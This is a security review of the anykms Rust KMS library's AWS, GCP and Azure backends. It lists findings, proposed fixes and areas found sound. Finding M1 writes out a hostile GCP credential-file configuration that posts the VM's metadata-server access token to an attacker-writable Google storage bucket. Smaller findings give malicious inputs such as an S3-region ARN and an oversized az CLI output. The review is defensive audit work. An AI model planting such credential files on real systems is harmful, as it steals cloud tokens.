# Security review: anykms cloud backends (`cloud-backends` @ b669fce)

**Status (2026-10-06):** All findings (1 medium, 6 low) and the informational notes are addressed on `cloud-backends`. See [PLAN §24](../PLAN.md#24-cloud-backends-implementation-status-2026-10-06).

Scope: `crates/anykms-aws`, `crates/anykms-gcp`, `crates/anykms-azure`, `crates/anykms-http`, and
`git diff dd3cc82..HEAD -- crates/anykms-core crates/anykms-recipes`. The review was read-only.
Nothing was built or run, and every finding below was checked against the source.

**Result: no critical or high issues. 1 medium, 6 low, plus informational notes.** The
key-binding, AAD, CRC32C, redirect, TLS and error-redaction rules all hold in the code. The
medium issue is a credential-exfiltration path through GCP credential files.

---

## Medium

### M1. GCP: the credential-file URL allowlist accepts any `*.googleapis.com` host, path and query, so a planted `external_account` file can post a local token to attacker-writable Google storage
- **Where:**
  - `crates/anykms-gcp/src/auth/mod.rs:189-201` (`url_allowed`).
  - It is applied to `token_uri` (`auth/file.rs:102`), `token_url` (`auth/external_account.rs:75`) and `service_account_impersonation_url`.
  - `credential_source.url` is unrestricted (`auth/external_account.rs:107-127`: plain `http://` to any host, with arbitrary headers taken from the file).
  - The subject token is form-POSTed to `token_url` exactly as given, path and query included (`external_account.rs:266-286`, `oauth.rs:174-187`).
- **Contract:** `docs/cloud/gcp.md` §4.3 (lines 279-283) says "Only the URLs fixed for each `type` are allowed … This keeps a planted credential file from sending subject tokens to arbitrary hosts". The code checks only the host suffix.
- **Scenario:** an application accepts a credential config from outside (`GOOGLE_APPLICATION_CREDENTIALS` set by a tenant, or a config upload). The attacker supplies an `external_account` file like this:
  - `credential_source.url = http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`
  - `credential_source.headers = {"Metadata-Flavor": "Google"}`
  - `format = {type: json, subject_token_field_name: access_token}`
  - `token_url = https://firebasestorage.googleapis.com/v0/b/<attacker-bucket>/o?name=leak` (or `https://storage.googleapis.com/upload/storage/v1/b/<bucket>/o?uploadType=media&name=leak`)

  The library fetches the VM's own access token as the "subject token" and POSTs it to an upload endpoint for a bucket the attacker made publicly writable. That host passes `url_allowed`, so the body is stored as an object the attacker can read. The same works with a `credential_source.file` that points at a local token file. I did not run this against live services. Both upload endpoints accept a raw request body as object content, and the anykms check passes, which I verified.
- **Fix:**
  - Allowlist per field instead of by suffix:
    - `token_uri`: exactly `https://oauth2.googleapis.com/token`.
    - `token_url`: `https://sts.googleapis.com/v1/token`, or `https://sts.<location>.rep.googleapis.com/v1/token`.
    - Impersonation URL: `https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<email>:generateAccessToken`.
    - Refuse any query or fragment.
  - Optionally restrict `credential_source.url` to loopback or link-local, or document that credential files are trusted input.
  - Add tests for the `storage.googleapis.com` and `firebasestorage.googleapis.com` upload URLs.

---

## Low

### L1. Azure: `public_key_version` ignores the version pinned in the URI; verify enforces the pin
- **Where:**
  - `crates/anykms-azure/src/handles.rs:747-756` (`public_key_inner`): any well-formed 32-hex version of the same key name is fetched.
  - Compare `handles.rs:376`: verify, unwrap and decrypt refuse a version other than the pinned one ("input names another version than the key URI pins").
- **Scenario:** an app opens `azure-kv://v.vault.azure.net/keys/jwt/<v2>` meaning "trust v2 only". It resolves JWT `kid` values through `public_key_version` (JWKS publication, or `CachedVerifier`-style resolution followed by local verification). A token whose `kid` names the retired v1 gets v1's public key and verifies locally, while `verify_digest` on the same handle would refuse it.
- **Impact:** the key never changes (same vault, same key name), so this is not key confusion. It is still an inconsistent trust boundary within one handle. GCP deliberately serves every version of the same key (`gcp/src/handles.rs:937-950`), so the cross-backend semantics need deciding.
- **Fix:** pick one rule. To keep the pin authoritative: when `self.k.uri.version()` is `Some(p)` and `v != p`, return `NotFound` before any I/O. To keep rotation-friendly JWKS: document that a pin selects the signing version only, and make verify consistent with that. Add a conformance case for the chosen rule.

### L2. Azure CLI credential: panic on a huge `expires_on`, and unbounded output buffering
- **Where:**
  - `crates/anykms-azure/src/cred/cli.rs:162`: `SystemTime::UNIX_EPOCH + Duration::from_secs(on)` panics on overflow.
  - `cli.rs:112-131`: `wait_with_output()` buffers all of stdout and stderr before the `MAX_OUTPUT` (64 KiB) check.
- **Scenario:** a broken or wrapped `az` (a shim on `PATH`, or a configured `program`) prints `{"accessToken":"x","expires_on":18446744073709551615}`, and the calling task panics. Separately, an `az` that streams gigabytes for 10 seconds forces that much memory before the size check runs.
- **Fix:**
  - Use `UNIX_EPOCH.checked_add(...)`, mapping overflow to `Unavailable`, as `credential.rs:401` already does.
  - Read the pipes through `take(MAX_OUTPUT + 1)` into zeroizing buffers, then `wait()`.

### L3. AWS: the region grammar accepts non-region labels, so a derived endpoint can be another AWS service's host
- **Where:**
  - `crates/anykms-aws/src/uri.rs:200-207` (`region_ok` = `[a-z0-9-]{1,32}`).
  - `uri.rs:100-102` (the `aws` partition only refuses `cn-` and `us-gov-` prefixes).
  - `endpoint.rs:29-33` (`kms.{region}.amazonaws.com`).
- **Scenario:** a URI from untrusted input on a provider with no region allowlist, for example `aws-kms://arn:aws:kms:s3:111122223333:key/<uuid>`. It resolves to `https://kms.s3.amazonaws.com/`, which is S3's virtual-host name for the bucket `kms`. The SigV4-signed `Encrypt` (plaintext and `x-amz-security-token`) goes to S3.
- **Why it stays low:** dots are refused, so the host is always `kms.<one label>.amazonaws.com|api.aws`, and the bucket name is fixed (`kms`). The receiver is AWS, the signature is scoped to service `kms` and can't be replayed elsewhere, and S3 rejects the request before storing anything. The "derived host is always a KMS endpoint" property still doesn't hold.
- **Fix:**
  - Require a region shape such as `^[a-z]{2}(-[a-z]+)+-\d{1,2}$`, plus the existing partition-prefix checks.
  - Document `allowed_regions` for untrusted URIs.

### L4. AWS: the endpoint cache grows without bound
- **Where:** `crates/anykms-aws/src/provider.rs:41, 118-136`. `urls: Mutex<BTreeMap<partition/region, Url>>` inserts on every open with a new region and never evicts.
- **Scenario:** a service opens keys from attacker-supplied URIs, for example URIs stored next to ciphertexts, with no region allowlist. Opening does no I/O, so millions of distinct regions (`a1`, `a2`, …) grow the map without limit.
- **Fix:** cache only configured overrides (derivation is a `format!`), or bound the map. Fixing L3 shrinks the key space as well.

### L5. AWS: the hidden public `Admin` API skips endpoint gating
- **Where:**
  - `crates/anykms-aws/src/admin.rs:33, 59`: `validate_url(endpoint, true, …)` passes `true` for "allow loopback HTTP".
  - The API is exposed through `AwsProvider::__admin()` (`provider.rs:267-272`) and `__private::Admin` (`lib.rs:112`), with no feature gate.
- **Scenario:** any code holding an `AwsProvider` can send the provider's SigV4 credentials (session token included) to an arbitrary https host. It also gets plain HTTP to loopback even when `allow_loopback_http` is off, bypassing the account and region allowlists. This is reachable only from code, not from input. That is why it is low.
- **Fix:** put `Admin` and `__admin` behind a non-default `test-fixtures` feature, and pass the provider's `allow_loopback_http` instead of `true`.

### L6. GCP: `AuthEndpoints::custom` is a test hatch without the loopback-HTTP opt-in
- **Where:** `crates/anykms-gcp/src/auth/mod.rs:155-185`.
  - It accepts `http://` on a literal loopback IP without the `allow_loopback_http` flag that the KMS `Endpoint::Custom` requires (`config.rs:83`).
  - Any custom https origin also becomes trusted for every credential-file URL (`mod.rs:190-193`) and for the metadata server.
- **Scenario:** production code that copies a test configuration silently sends tokens over plain HTTP to a loopback port, which any local process can bind. It needs an explicit builder call, so it can't be reached from the environment.
- **Fix:** require the same `allow_loopback_http` opt-in for `http://`, and label `custom` test-only in the docs. Consider `#[doc(hidden)]`, or a feature gate.

---

## Informational (no exploit; fix for consistency)

- **AWS docs vs code on versions.** `crates/anykms-aws/src/lib.rs:39-40` and `docs/cloud/aws.md` §8 say a missing version is `InvalidArgument`, and aws.md says a foreign ARN is `VerificationFailed`. The code (`handles.rs:517-537, 1093`) verifies a version-less signature with the handle's own key, and returns `NotFound` for a foreign ARN before any I/O. The code is safe; align the docs.
- **AWS alias responses rebind `resolved`.** For alias URIs, `response_key` (`handles.rs:487-500`) accepts any key ARN the server returns and records it as the resolved key (`note_resolved`). Its account and region are not compared with the alias's. The server is trusted, but key URIs already get an equality check.
- **AWS builder `Debug`** prints `endpoints` and `endpoint_url` raw (`config.rs:81-82`), while `proxy` is redacted. `validate` rejects URLs with userinfo, but a builder Debug-printed before `build()` would show it.
- **Azure `nextLink`** (`handles.rs:417-441`) is correctly limited to the same scheme, host, port and path, but keeps any `api-version` the server sends. That breaks the "pinned api-version" rule (`config.rs:259-260`). Strip it and re-append the pinned value.
- **3xx classification.** AWS (`errors.rs`), GCP (`errors.rs` `classify`, `auth/oauth.rs:80`) and Azure map 3xx to `Configuration`. The shared.md §5 checklist says `Unavailable`. Redirects are never followed (`anykms-http/src/client.rs:160`), and no `Location` or body is echoed.
- **`anykms_http::client::ClientOptions`** derives `Debug` with a raw `proxy: Option<String>` (`client.rs:75-84`), which may contain userinfo. Every backend builds it transiently and never stores or prints it, so this is latent. A manual `Debug` that redacts the proxy would remove it.
- **Residual: reqwest body copies.** `RequestBuilder::body(Vec)` and the response `Bytes` chunks are not wiped. All three backends document this, and the zeroizing wrappers cover everything anykms owns.

---

## Checked and found sound

**Credentials and hosts**
- AWS:
  - The ARN is strict, with no `?#%`. Partition and region prefixes are cross-checked, and the account must be 12 digits.
  - Derived hosts stay under `amazonaws.com`, `api.aws` or the `.cn` suffixes. Overrides must be https, with no userinfo, query or fragment. HTTP is allowed only to a literal loopback IP and only with `allow_loopback_http`.
  - Container credential endpoint: SDK allowlist (169.254.170.2, 169.254.170.23, fd00:ec2::23, loopback, or https).
  - IMDS: v2 only, no proxy, role name charset-checked.
  - `credential_process`: `sh -c` (matches the SDK), stdin null, stderr discarded, output capped at 64 KiB in a zeroizing buffer, 60 s timeout, `kill_on_drop`.
- Azure:
  - `HostPolicy::resolve` (`config.rs:186-233`) matches the suffix exactly, with a 3-24 character `[a-z0-9-]` first label and no ports unless the host is an exact test host.
  - The token scope is `https://{suffix}/.default`, taken from the allowlisted suffix. `WWW-Authenticate` is used only for a tenant hint shown in diagnostics.
  - IMDS is limited to 169.254.169.254 or loopback. The `az` arguments are passed as an array, and the tenant is charset-checked.
- GCP:
  - The suffix matcher rejects ports, userinfo, http, trailing dots, `evilgoogleapis.com` and `googleapis.com.evil` (but see M1).
  - The regional host comes from a location matching `[a-z0-9-]{1,63}`. The metadata response must carry `Metadata-Flavor: Google`. `executable` and AWS credential sources are refused.

**Key binding**
- AWS:
  - `Decrypt` sends `KeyId = self.arn()`, and `ReEncrypt` sends Source = Destination = `self.arn()` (`handles.rs:572-606`).
  - Verify, VerifyMac and `public_key_version` compare the version to the resolved ARN before any I/O, then re-check the response `KeyId`.
- GCP:
  - Response `name` is checked on every operation. Versions are decimal only and are always placed under `self.key.version_name(v)`.
- Azure:
  - Frame versions must be 32 hex characters and are only ever a path segment under the handle's own key name. A response `kid` must name the same host and key.

**AAD and integrity**
- AWS: AAD maps to `{"anykms-aad": base64url_nopad(aad)}`, or to no context for empty AAD. This is injective. AAD is capped at 3072 B, and the native context refuses the reserved key (`context.rs:33-53, 111-130`).
- GCP CRC32C:
  - A CRC is sent for every input field.
  - Every `verified*` flag is required to be true (it defaults to false, so a missing flag fails closed): `handles.rs:577-582, 790-792, 1203+`.
  - Response CRCs are checked for ciphertext, plaintext, signature, MAC and PEM.
- Azure `framing.rs`:
  - Every length is bounds-checked: version length ≤ 64, GCM body ≥ 28 B, KW body ≥ 24 B and a multiple of 8.
  - The RSA ciphertext length must match the modulus. `k - 66` can't underflow because keys under 2048 bits are refused.

**Errors**
- All backends reduce server messages to pinned texts, or to a length plus an HMAC fingerprint. OAuth `error_description` is dropped.
- `transport_error` strips URLs (`without_url`), and connect and TLS failures get fixed messages.

**Transport**
- `ClientOptions::build` sets `redirect::Policy::none()` and `no_proxy()` by default, plus connect and request timeouts.
- `TlsOptions` has no verification bypass: `ca_pem` replaces the roots, and `require_roots(false)` is used only for loopback-HTTP clients.
- Encrypted private keys are refused, and PEM decoding is zeroizing.

**Zeroization**
- Request bodies go through `zbuf::json_body` and `extend`, which wipe on growth (no unwiped realloc copies).
- `read_body` is bounded and zeroizing, and `Content-Length` is trusted only up to 64 KiB.
- Decoded plaintext is `Zeroizing`, and owned source strings are wiped.

**Core and recipes diff**
- `ExtensionOutput` downcasting is type-safe (`Any`); a mismatch returns `Backend` and never panics.
- `KeyWrapDataKeys` refuses non-empty AAD before the RNG runs or any I/O.
- `ClientRewrap` keeps the plaintext in `Zeroizing`.
- `rsa_oaep_sha256_encrypt` enforces ≥ 2048 bits and checks the message length.
- The new layers (`Retry`, `Observe`) only forward calls.

**Panics on malformed server input**
- No unchecked indexing or unwrap on server data was found. RFC 3339 parsers are bounds-safe and limited to 4-digit years. Int64 CRC fields reject values outside `u32`. Response sizes are capped (AWS 256 KiB, GCP 4 MiB, Azure 1 MiB, token responses 64 KiB).
- The one exception is L2, where the input comes from a local CLI rather than a server.
